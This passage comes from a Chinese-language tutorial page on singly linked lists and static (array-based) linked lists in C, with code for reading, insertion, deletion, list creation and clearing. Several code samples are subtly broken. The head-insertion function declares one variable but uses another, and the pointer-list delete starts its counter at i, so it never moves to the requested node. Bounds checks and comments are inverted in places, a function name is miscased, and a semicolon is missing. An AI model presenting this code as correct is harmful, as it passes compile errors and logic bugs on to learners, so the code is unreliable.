operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">}</span>Node<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> Node<span class="token operator">*</span> LinkList<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义LinkList</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="单链表的读取"><a href="#单链表的读取" class="headerlink" title="单链表的读取"></a>单链表的读取</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">GetElem</span><span class="token punctuation">(</span>LinkList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType<span class="token operator">*</span> e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//用e返回L中第i个数据元素的值</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    LinkList p<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//声明指针p</span>    p <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//p指向链表L的第一个节点</span>    j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//j为计数器</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//p不为空且计数器j还没有等于i时，循环继续</span>    <span class="token punctuation">{</span>        p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p指向下一个节点</span>        <span class="token operator">++</span>j<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>p <span class="token operator">||</span> j <span class="token operator">></span> i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//第i个节点不存在</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>e <span class="token operator">=</span> p<span class="token operator">-></span>data<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//取第i个节点的数据</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="单链表的插入"><a href="#单链表的插入" class="headerlink" title="单链表的插入"></a>单链表的插入</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ListInsert</span><span class="token punctuation">(</span>LinkList<span class="token operator">*</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//在L的第i个节点之前插入元素e，L的长度加1</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    LinkList p<span class="token punctuation">,</span>s<span class="token punctuation">;</span>    p <span class="token operator">=</span> <span class="token operator">*</span>L<span class="token punctuation">;</span>    j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//寻找第i-1个节点</span>    <span class="token punctuation">{</span>        p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token operator">++</span>j<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>p <span class="token operator">||</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//第i个节点不存在</span>    <span class="token punctuation">}</span>    s <span class="token operator">=</span> <span class="token punctuation">(</span>LinkList<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//生成新节点</span>    s<span class="token operator">-></span>data <span class="token operator">=</span> e<span class="token punctuation">;</span>    s<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//将p的后继节点赋值给s的后继</span>    p<span class="token operator">-></span>next <span class="token operator">=</span> s<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//将s赋值给p的后继</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="单链表的删除"><a href="#单链表的删除" class="headerlink" title="单链表的删除"></a>单链表的删除</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">LinkDelete</span><span class="token punctuation">(</span>LinkList<span class="token operator">*</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType<span class="token operator">*</span> e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除L中的第i个节点，并用e返回其值，L的长度减1</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    LinkList p<span class="token punctuation">,</span> q<span class="token punctuation">;</span>    p <span class="token operator">=</span> <span class="token operator">*</span>L<span class="token punctuation">;</span>    j <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>next <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//遍历寻找第i-1个节点</span>    <span class="token punctuation">{</span>        p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token operator">++</span>j<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>p<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token operator">||</span> j <span class="token operator">></span> i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//第i个节点不存在</span>    <span class="token punctuation">}</span>    q <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>    p<span class="token operator">-></span>next <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将q的后继赋值给p的后继</span>    <span class="token operator">*</span>e <span class="token operator">=</span> q<span class="token operator">-></span>data<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//将q节点中的数据给e</span>    <span class="token function">free</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="单链表的整表创建"><a href="#单链表的整表创建" class="headerlink" title="单链表的整表创建"></a>单链表的整表创建</h4><h5 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">CreateListHead</span><span class="token punctuation">(</span>LinkList<span class="token operator">*</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//随机产生n个元素的值，建立带表头节点的单链线性表L（头插法）</span><span class="token punctuation">{</span>    LinkList o<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//初始化随机种子</span>    <span class="token operator">*</span>L <span class="token operator">=</span> <span class="token punctuation">(</span>LinkList<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>L<span class="token punctuation">)</span><span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//先建立一个带头结点的单链表</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        p <span class="token operator">=</span> <span class="token punctuation">(</span>LinkList<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//生成新节点</span>        p<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//随机生成100以内的数字</span>        p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>L<span class="token punctuation">)</span><span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token operator">*</span>L<span class="token punctuation">)</span><span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//插入到表头</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">CreateListTail</span><span class="token punctuation">(</span>LinkList<span class="token operator">*</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//随机产生n个元素的值，建立带表头节点的单链线性表L（尾插法）</span><span class="token punctuation">{</span>    LinkList p<span class="token punctuation">,</span> r<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>L <span class="token operator">=</span> <span class="token punctuation">(</span>LinkList<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    r <span class="token operator">=</span> <span class="token operator">*</span>L<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        p <span class="token operator">=</span> <span class="token punctuation">(</span>Node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//生成新节点</span>        p<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        r<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//将表尾终端节点的指针指向新节点</span>        r <span class="token operator">=</span> p<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//将当前的新节点定义为表尾终端节点</span>    <span class="token punctuation">}</span>    r<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//表示当前链表结束</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="清空链表"><a href="#清空链表" class="headerlink" title="清空链表"></a>清空链表</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ClearList</span><span class="token punctuation">(</span>LinkList<span class="token operator">*</span> L<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//单链表的整表删除，将L置为空表</span><span class="token punctuation">{</span>    LinkList p<span class="token punctuation">,</span> q<span class="token punctuation">;</span>    p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>L<span class="token punctuation">)</span><span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p指向第一个节点</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//没到表尾</span>    <span class="token punctuation">{</span>        q <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        p <span class="token operator">=</span> q<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token operator">*</span>L<span class="token punctuation">)</span><span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//头结点指针域为空</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="单链表结构与顺序存储结构优缺点"><a href="#单链表结构与顺序存储结构优缺点" class="headerlink" title="单链表结构与顺序存储结构优缺点"></a>单链表结构与顺序存储结构优缺点</h4><p><strong><em>1、存储分配方式</em></strong></p><p>​        <strong><em>①顺序存储结构一般用一段连续的存储单元依次存储线性表的数据元素</em></strong></p><p>​        <strong><em>②单链表采用链式存储结构，用一组任意的存储大单元存放线性表的元素</em></strong></p><p><strong><em>2、时间性能</em></strong></p><p><strong><em>①查找</em></strong></p><p><strong><em>ⅰ顺序存储结构O(1)</em></strong></p><p><strong><em>ⅱ单链表O(n)</em></strong></p><p><strong><em>②插入和删除</em></strong></p><p>​        <strong><em>ⅰ顺序存储结构需要平均移动表长一半的元素，时间为o(n)</em></strong></p><p>​        <strong><em>ⅱ单链表在线出某位置的指针后，插入和删除时间仅为o(1)</em></strong></p><p><strong><em>③空间性能</em></strong></p><p>​        <strong><em>ⅰ顺序存储结构需要预分配存储空间，分大了，浪费，分小了，易发生上溢</em></strong></p><p>​        <strong><em>ⅱ单链表不需要分配存储空间，只要有就可以分配，元素个数也不受限制</em></strong></p><h2 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>用数组描述的链表叫做静态链表 ；</p><p>具体描述：首先让数组的两个元素都是由两个数据域组成，data和cur；也就是说，数组的每个下标都对应一个</p><p>data和cur；数据域data，用来存放数据元素,也就是通常我们要处理的数据；而cur相当于链表中的next指针，存</p><p>放该元素的后继在数组中的下标，我们把cur叫做游标；</p><p>小注：这里我理解的游标就是next那根链，元素的游标指向下一个数值的下标；;</p><h3 id="静态链表存储结构"><a href="#静态链表存储结构" class="headerlink" title="静态链表存储结构"></a>静态链表存储结构</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 1000 </span><span class="token comment" spellcheck="true">// 假设链表最大长度是1k</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    ElemType data<span class="token punctuation">;</span>    <span class="token keyword">int</span> cur<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//游标，为0时表示无指向</span><span class="token punctuation">}</span>StaticLinkList<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="初始化数组"><a href="#初始化数组" class="headerlink" title="初始化数组"></a>初始化数组</h3><p>0-998游标从1-999，最后一个游标为0</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">InitLink</span><span class="token punctuation">(</span>StaticLinkList space<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将一位数组space中各分量链成一备用链表，space[0].cur为头指针，"0"表示空指针</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAXSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        space<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>cur <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    space<span class="token punctuation">[</span>MAXSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cur <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//目前静态链表为空，最后一个元素的cur为0</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：</p><p>​    我们通常把未使用的数组元素成为备用链表；</p><p>​    数组的第一个元素，即下标为0的那个元素的cur就存放备用链表的第一个节点的下标；</p><p>​    数组的最后一个元素，即下标为MAXSIZE-1的cur则存放第一个有数值的元素的下标，相当于头节点的作用；</p><h3 id="获取链表中元素的个数"><a href="#获取链表中元素的个数" class="headerlink" title="获取链表中元素的个数"></a>获取链表中元素的个数</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ListLength</span><span class="token punctuation">(</span>StaticLinkList L<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> L<span class="token punctuation">[</span>MAXSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//最后一个元素的游标，从头循环计数</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//循环计数，找到空闲分量即停止循环</span>    <span class="token punctuation">{</span>        i <span class="token operator">=</span> L<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span>         j<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//计数</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> j<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="静态链表的插入操作"><a href="#静态链表的插入操作" class="headerlink" title="静态链表的插入操作"></a>静态链表的插入操作</h3><h4 id="获得空闲分量的下标"><a href="#获得空闲分量的下标" class="headerlink" title="获得空闲分量的下标"></a>获得空闲分量的下标</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">Malloc_SSL</span><span class="token punctuation">(</span>StaticLinkList space<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若备用空间链表为空，则返回分配的节点下标，否则返回0</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> space<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//当前数组第一个元素cur存的值，就是要返回的第一个备用空闲的下标</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>space<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        space<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cur <span class="token operator">=</span> space<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 由于要拿出一个分量来使用，所以我们就得把它的下一个分量用来做备用</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ListInsert</span><span class="token punctuation">(</span>StaticLinkList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 在L中第i个元素之前插入新的数据元素e</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> j<span class="token punctuation">,</span> k<span class="token punctuation">,</span> l<span class="token punctuation">;</span>    k <span class="token operator">=</span> MAXSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//k是最后一个元素的下标</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span><span class="token function">Listlength</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    j <span class="token operator">=</span> <span class="token function">Malloc_SSL</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获得空闲分量的下标</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        L<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>data <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将数值赋值给此分量的data</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> l <span class="token operator">&lt;=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> l<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//找到第i个元素之前的位置</span>        <span class="token punctuation">{</span>            k <span class="token operator">=</span> L<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        L<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>cur <span class="token operator">=</span> L<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//把第i个元素之前的cur赋值给新元素的cur</span>        L<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>cur <span class="token operator">=</span> j<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//把新元素的下标赋值给第i个元素之前元素的cur</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="静态链表的删除操作"><a href="#静态链表的删除操作" class="headerlink" title="静态链表的删除操作"></a>静态链表的删除操作</h3><h4 id="回收节点"><a href="#回收节点" class="headerlink" title="回收节点"></a>回收节点</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">Free_SSL</span><span class="token punctuation">(</span>StaticLinkList space<span class="token punctuation">,</span><span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//将下标为k的空闲节点回收到备用链表</span><span class="token punctuation">{</span>    space<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>cur <span class="token operator">=</span> space<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//把第一个元素cur值赋给要删除的分量cur</span>    space<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cur <span class="token operator">=</span> k<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//把要删除的分量下标赋给第一个元素的cur</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ListDelete</span><span class="token punctuation">(</span>StaticLinkList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 删除L中第i个元素e</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span><span class="token function">ListLength</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">}</span>    k <span class="token operator">=</span> MAXSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        k <span class="token operator">=</span> L<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// j > k</span>    j <span class="token operator">=</span> L<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//L[k].cur指向删除元素的下标，赋值给j</span>    L<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>cur <span class="token operator">=</span> L<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>cur<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//被删除元素的游标赋值给前一个元素的游标，实现连接</span>    <span class="token function">Free_SSL</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//回收</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="静态链表优缺点"><a href="#静态链表优缺点" class="headerlink" title="静态链表优缺点"></a>静态链表优缺点</h3><p><strong><em>1、优点：</em></strong></p><p>​        